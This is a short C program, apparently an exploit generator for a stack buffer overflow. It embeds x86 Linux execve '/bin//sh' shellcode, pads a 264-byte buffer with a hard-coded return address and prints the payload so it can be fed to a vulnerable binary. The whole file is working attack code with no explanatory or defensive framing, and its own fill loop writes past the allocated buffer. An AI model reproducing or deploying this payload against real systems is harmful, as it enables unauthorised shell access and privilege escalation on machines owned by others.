#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char shellcode[] = 
	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x68""/bin"
	"\x89\xe3"
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80"
	;

int main(void) {
	char *buff, *ptr;
	long *adr_ptr;
	int i;
	buff = malloc(264);
	ptr = buff;
	adr_ptr = (long *)ptr;
	for (i=0; i<264+strlen(shellcode); i+=4)
		*(adr_ptr++) = 0x8048432;
	ptr = buff+264;
	for (i=0; i<strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	buff[264+strlen(shellcode)] = '\0';
	printf("%s", buff);
}
